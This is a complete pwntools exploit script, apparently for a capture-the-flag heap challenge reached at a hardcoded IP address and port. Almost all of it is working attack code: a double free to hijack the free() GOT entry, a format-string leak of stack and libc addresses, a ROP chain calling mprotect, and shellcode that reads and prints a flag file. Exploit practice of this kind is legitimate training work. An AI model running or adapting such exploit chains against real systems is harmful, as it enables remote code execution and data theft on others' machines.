#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 60902 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')
context.arch='amd64'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.172'
port = int(args.PORT or 60902)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x401612
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
secomp = 0x40154a

if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("./libc.so.6")

def create(size,msg):
    io.sendlineafter("> ", "1")
    io.sendlineafter(" : ", str(size))
    io.sendlineafter(" : ", str(msg))

def delete(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter(" : ", str(idx))


for _ in range(7):
    create(0x18, 'A' * 8)

create(0x18, 'A' * 8)
create(0x18, 'A' * 8)
#
for i in range(7):
    delete(i)

delete(7)
delete(8)
delete(7)
#
for _ in range(7):
    create(0x18, 'A' * 8)

create(0x18, p64(exe.got['free']).ljust(0x10,"a"))

# print (hex(exe.got['free']))
# print (p64(exe.got['free']))
for _ in range(7):
    create(0x70, 'B' * 8)
#
create(0x70, 'B' * 8)
create(0x70, 'B' * 8)
#
for i in range(7):
    delete(i + 17)
#
delete(17 + 7)
delete(17 + 8)
delete(17 + 7)
#
for _ in range(7):
    create(0x70, 'B' * 8)

create(0x18, 'A' * 8)
create(0x18, '%6$p||%21$p||EOF')
create(0x18, p64(0x401150)) # elf.plt.printf

delete(34)

leaks = io.recvuntil(b'EOF', 1).split(b'||')
stack = int(leaks[0], 16)
if args.LOCAL:
    libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 234
else :
    libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 243
print ('STACK', hex(stack))
print ('LIBC ', hex(libc.address))

create(0x70, p64(stack - 56))
create(0x70, 'C' * 8)
create(0x70, 'C' * 8)
#
print (hex(stack))
stack_base = (stack & ~0xfff) - 0x1e000

print "stack base", hex(stack_base)

rop = ROP(libc)
rop.call(libc.sym['mprotect'], [stack_base, 0x21000, 0x7])

print rop.dump()
rop = rop.chain()

sleep(0.5)

shellcode = '''
xor rdi, rdi
lea rsi, [rsp+8]
mov rdx, 0x200
xor rax, rax
syscall
'''
# xor rax, rax
# xor rdx, rdx
# lea rdi, [rsp+8]
# mov rdx, rsi
# mov rsi, rdi
# xor rdi, rdi
# syscall

# gdb.attach(io,'''
# b *0x401470
# b *0x401475
# # c
# ''')

p = rop + p64(stack - 56 + len(rop)+ 8) + asm(shellcode)
print "len rop :",len(rop)
print "len payload :", len(p)
assert p > 0x70

# create(0x70, rop + p64(stack - 56 + 0x48 - 8) + asm(shellcode))
create(0x70, p)

shellcode = '''
xor rax, rax
add rsp, 0x100
'''
size=0x200
# shellcode += shellcraft.pushstr('/app/flag_i5HR6cBpwxxyTixR.txt')
shellcode += shellcraft.pushstr('./flag.txt')
# shellcode += shellcraft.pushstr('./')
shellcode += shellcraft.open('rsp', 0, 0)
# shellcode += shellcraft.getdents64('rax', 'rsp', size)
shellcode += shellcraft.read('rax', 'rsp', size)
shellcode += shellcraft.write(1, 'rsp', size)


shellcode = 'A' * 13 + asm(shellcode)

io.sendline(shellcode)

# io.recv(100)
# io.recv()
# data = io.recv()
# data = dirents(data)
# print data

io.interactive()
